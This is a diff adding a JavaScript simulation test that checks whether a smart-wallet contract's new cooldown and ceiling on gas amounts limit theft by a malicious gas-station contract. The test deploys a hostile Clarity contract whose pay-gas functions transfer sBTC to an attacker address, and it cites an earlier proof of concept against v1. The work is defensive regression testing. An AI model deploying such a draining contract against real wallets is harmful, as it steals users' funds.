@@ -1,0 +1,160 @@
+// simul-max-gas-cooldown-v6.js
+// Repoint of simul-max-gas-cooldown-v4.js at the DEPLOYED juice-safe-v6.
+// onboard now takes SIX args -- recovery is a bare principal, not an optional,
+// and cooldown-period is caller-supplied instead of hardcoded u144.
+// simul-max-gas-cooldown-v4.js
+//
+// REPOINT of simul-max-gas-cooldown.js at the DEPLOYED juice-safe-v6. The assertions are
+// unchanged -- the point is that the v4/v14 gas-metering rewrite and the
+// Clarity 6 allowance renames ((with-pox), (with-staking)) did not regress any
+// of it. Prose below still describes the delta as it was written for juice-safe-v2;
+// read it as history, not as the target.
+//
+// New in v4 and NOT covered here: pay-gas-accounted's balance-delta metering
+// and the gas fuse. That is simul-gas-metering-v4.js.
+//
+// simul-max-gas-cooldown.js
+// The NEW code in juice-safe-v6 / fakfun-wallet-v11: max-gas-amount is no
+// longer an instant admin knob. It is now
+//   propose-max-gas-amount  (admin, <= MAX-GAS-CEILING u10000)
+//   confirm-max-gas-amount  (admin, only after the wallet cooldown)
+//
+// This exists because the <gas-trait> contract is caller-supplied and NOT bound
+// by the signed hash, and the gas path never consults
+// would-exceed-sbtc-threshold. Previously a compromised admin could raise the
+// cap silently and instantly, and the next gasless action would leak the lot to
+// a hostile station. PoC against v1:
+// https://stxer.xyz/simulations/mainnet/bf0a97e5584c479e15242447dec7d485
+//
+// Run against the DEPLOYED juice-safe-v6. Nothing is redeployed.
+//   node simul-max-gas-cooldown.js
+import crypto from "node:crypto";
+import {
+  tupleCV, uintCV, bufferCV, noneCV, someCV, principalCV, standardPrincipalCV,
+  stringAsciiCV, contractPrincipalCV, serializeCV, deserializeCV, cvToString,
+  ClarityVersion, PostConditionMode,
+} from "@stacks/transactions";
+import { SimulationBuilder, getSimulationResult } from "stxer";
+import { generateP256Keypair, signChallengeWithRpId } from "./lib-webauthn-test-signer.mjs";
+
+const D = "SPV9K21TBFAK4KNRJXF5DFP8N7W46G4V9RCJDC22";
+const FAKFUN_DEPLOYER = "SP28MP1HQDJWQAFSQJN2HBAXBVP7H7THD1W2NYZVK";
+const OWNER = "SP2C7BCAP2NH3EYWCCVHJ6K0DMZBXDFKQ56KR7QN2";
+const RECOVERY = "SP3HXJJMJQ06GNAZ8XWDN1QM48JEDC6PP6W3YZPZJ";
+const RELAYER = "SP102V8P0F7JX67ARQ77WEA3D3CFB5XW39REDT0AM";
+const ATTACKER = "SP1MGH8BH1KRY49Z7EE5TY0JVKT6C3NT9RTVM8FND";
+const STX_WHALE = "SP9BP4PN74CNR5XT7CMAMBPA0GWC9HMB69HVVV51";
+const SBTC = "SM3VDXK3WZZSA84XXFKAFAF15NNZX32CTSG82JFQ4.sbtc-token";
+const WALLET = `${D}.juice-safe-v6`;
+const CORE = `${D}.fakfun-wallet-core`;
+const API = "http://77.42.3.101/stacks-api";
+const RP_ID = "juiceofbtc.com";
+
+const CEILING = 10_000;      // MAX-GAS-CEILING
+const OVER_CEILING = 20_000; // must be rejected outright
+const NEW_CAP = 5_000;       // legal, still needs the cooldown
+const SBTC_FUND = 500_000;
+
+// The same hostile station used against v1 -- it now cannot take more than
+// whatever max-gas-amount is, and that is ceilinged.
+const EVIL = `(impl-trait '${D}.gas-station-trait.gas-station-trait)
+(define-public (get-gas-amount) (ok u${NEW_CAP}))
+(define-public (pay-gas)
+  (contract-call? '${SBTC} transfer u${NEW_CAP} contract-caller '${ATTACKER} none))
+(define-public (pay-gas-with-pyth)
+  (contract-call? '${SBTC} transfer u${NEW_CAP} contract-caller '${ATTACKER} none))`;
+
+const P = Buffer.from("534950303138", "hex");
+const sha256 = (b) => crypto.createHash("sha256").update(b).digest();
+const cvh = (cv) => { const o = serializeCV(cv); return typeof o === "string" ? sha256(Buffer.from(o, "hex")) : sha256(Buffer.from(o)); };
+const dom = () => cvh(tupleCV({ name: stringAsciiCV("smart-wallet-standard"), version: stringAsciiCV("1.0.0"), "chain-id": uintCV(1), wallet: principalCV(WALLET) }));
+const chal = (t) => sha256(Buffer.concat([P, dom(), cvh(t)]));
+const tStake = (id, amt) => tupleCV({ topic: stringAsciiCV("stake-stx-juice-pox5"), "auth-id": uintCV(id), "amount-ustx": uintCV(amt) });
+const strip = (h) => (h.startsWith("0x") ? h.slice(2) : h);
+const sa = (id, pk, s) => tupleCV({ "auth-id": uintCV(id), pubkey: bufferCV(Buffer.from(strip(pk), "hex")), signature: bufferCV(Buffer.from(strip(s.signatureHex), "hex")), "authenticator-data": bufferCV(Buffer.from(strip(s.authenticatorDataHex), "hex")), "client-data-prefix": bufferCV(Buffer.from(strip(s.clientDataPrefixHex), "hex")), "client-data-suffix": bufferCV(Buffer.from(strip(s.clientDataSuffixHex), "hex")) });
+
+const key = generateP256Keypair();
+const pubkeyCV = bufferCV(Buffer.from(strip(key.pubKeyHex), "hex"));
+const sigStake = signChallengeWithRpId(chal(tStake(1, 100_000_000)), key.privKey, RP_ID);
+// confirm-max-gas-amount is PASSKEY-gated now (was admin, zero-arg) and the hash
+// binds the PENDING amount, so a signature collected for a modest raise cannot be
+// replayed against a larger proposal swapped in afterwards. Mirrors helpers-v10
+// build-confirm-max-gas-amount-hash.
+const tConfirmGas = (id, amt) => tupleCV({ topic: stringAsciiCV("confirm-max-gas-amount"), "auth-id": uintCV(id), amount: uintCV(amt) });
+const signGas = (id, amt) => sa(id, key.pubKeyHex, signChallengeWithRpId(chal(tConfirmGas(id, amt)), key.privKey, RP_ID));
+
+const plan = [];
+const b = SimulationBuilder.new({ stacksNodeAPI: API });
+const call = (l, snd, cid, fn, args, exp) => { b.withSender(snd).addContractCall({ contract_id: cid, function_name: fn, function_args: args, post_condition_mode: PostConditionMode.Allow }); plan.push({ l, exp }); };
+const ev = (l, code, cap) => { b.addEvalCode(WALLET, code); plan.push({ l, cap, ev: true }); };
+const ok = /^\(ok/;
+
+b.withSender(D).addContractDeploy({ contract_name: "zz-evil-gas-2", source_code: EVIL, clarity_version: ClarityVersion.Clarity5 });
+plan.push({ l: "deploy the hostile gas station" });
+call("set-verified-contract", D, CORE, "set-verified-contract", [principalCV(WALLET), noneCV()], ok);
+call("onboard", FAKFUN_DEPLOYER, WALLET, "onboard",
+  [pubkeyCV, standardPrincipalCV(OWNER), standardPrincipalCV(RECOVERY), uintCV(100_000_000), uintCV(100_000), uintCV(144)], ok);
+b.withSender(STX_WHALE).addSTXTransfer({ recipient: WALLET, amount: 500_000_000 });
+plan.push({ l: "fund 500 STX" });
+call(`fund ${SBTC_FUND} sats sBTC`, OWNER, SBTC, "transfer",
+  [uintCV(SBTC_FUND), standardPrincipalCV(OWNER), principalCV(WALLET), noneCV()], ok);
+
+ev("default max-gas-amount", "(var-get max-gas-amount)", "g0");
+
+// --- the ceiling ---------------------------------------------------------
+call(`G1 propose ${OVER_CEILING} (> ceiling u${CEILING}) -> u4018`, OWNER, WALLET,
+  "propose-max-gas-amount", [uintCV(OVER_CEILING)], "(err u4018)");
+call("G2 propose by a RANDOM principal -> u4001", ATTACKER, WALLET,
+  "propose-max-gas-amount", [uintCV(NEW_CAP)], "(err u4001)");
+call("G3 confirm with nothing proposed -> u4016", OWNER, WALLET,
+  "confirm-max-gas-amount", [signGas(2, 0), noneCV()], "(err u4016)");
+
+// --- the cooldown --------------------------------------------------------
+call(`G4 propose ${NEW_CAP} (legal) -> ok`, OWNER, WALLET,
+  "propose-max-gas-amount", [uintCV(NEW_CAP)], ok);
+ev("max-gas-amount right after propose (must be UNCHANGED)", "(var-get max-gas-amount)", "g1");
+ev("pending-max-gas", "(get-pending-max-gas)", "pend");
+call("G5 confirm BEFORE the cooldown -> u4012", OWNER, WALLET,
+  "confirm-max-gas-amount", [signGas(3, NEW_CAP), noneCV()], "(err u4012)");
+
+// the drain must still be capped at the OLD value while the raise is pending
+ev("attacker sBTC before", `(contract-call? '${SBTC} get-balance '${ATTACKER})`, "a0");
+call("G6 hostile gas station DURING the cooldown", RELAYER, WALLET, "stake-stx-juice",
+  [uintCV(100_000_000), someCV(sa(1, key.pubKeyHex, sigStake)),
+   someCV(contractPrincipalCV(D, "zz-evil-gas-2"))], /.*/);
+ev("attacker sBTC after", `(contract-call? '${SBTC} get-balance '${ATTACKER})`, "a1");
+
+b.addAdvanceBlocks({ bitcoin_blocks: 150, stacks_blocks_per_bitcoin: 1 });
+plan.push({ l: "advance 150 (past the u144 cooldown)" });
+call("G6b confirm with the ADMIN KEY and a signature for the WRONG amount -> u4002",
+  OWNER, WALLET, "confirm-max-gas-amount", [signGas(5, 9999), noneCV()], "(err u4002)");
+call("G7 confirm AFTER the cooldown -> ok", OWNER, WALLET, "confirm-max-gas-amount", [signGas(4, NEW_CAP), noneCV()], ok);
+ev("max-gas-amount after confirm", "(var-get max-gas-amount)", "g2");
+ev("pending cleared", "(get-pending-max-gas)", "pend2");
+
+const id = await b.run();
+const url = `https://stxer.xyz/simulations/mainnet/${id}`;
+console.log(`\n${url}\n`);
+const res = await getSimulationResult(id);
+const dtx = (s) => { const t = s?.Result?.Transaction; if (!t) return ""; return "Err" in t ? "ABORT" : cvToString(deserializeCV(t.Ok.result)); };
+const dev = (s) => { const e = s?.Result?.Eval; return e && "Ok" in e ? cvToString(deserializeCV(e.Ok)) : "?"; };
+let pass = 0, fail = 0; const cap = {};
+res.steps.forEach((s, i) => {
+  const p = plan[i]; if (!p) return;
+  if (p.ev) { const v = dev(s); if (p.cap) cap[p.cap] = v; console.log(`INFO  ${p.l}: ${v}`); return; }
+  const d = dtx(s);
+  if (!p.exp) { console.log(`      ${p.l} -> ${d}`); return; }
+  const good = p.exp instanceof RegExp ? p.exp.test(d) : d === p.exp;
+  console.log(`${good ? "PASS" : "FAIL"}  ${p.l} -> ${d}`);
+  good ? pass++ : fail++;
+});
+const u = (x) => BigInt((String(x).match(/u(\d+)/) || [])[1] ?? "-1");
+console.log("\n--- state checks ---");
+const chk = (l, c) => { console.log(`${c ? "PASS" : "FAIL"} ${l}`); c ? pass++ : fail++; };
+chk("propose did NOT change max-gas-amount", u(cap.g1) === u(cap.g0));
+chk("confirm after cooldown DID change it", u(cap.g2) === BigInt(NEW_CAP));
+chk("pending cleared after confirm", /proposed-at u0/.test(String(cap.pend2)));
+chk(`hostile station capped at the OLD ${cap.g0} during the cooldown`,
+  u(cap.a1) - u(cap.a0) <= u(cap.g0));
+console.log(`   attacker took ${u(cap.a1) - u(cap.a0)} sats while the raise was pending`);
+console.log(`\n=== ${pass} passed, ${fail} failed ===\n${url}`);
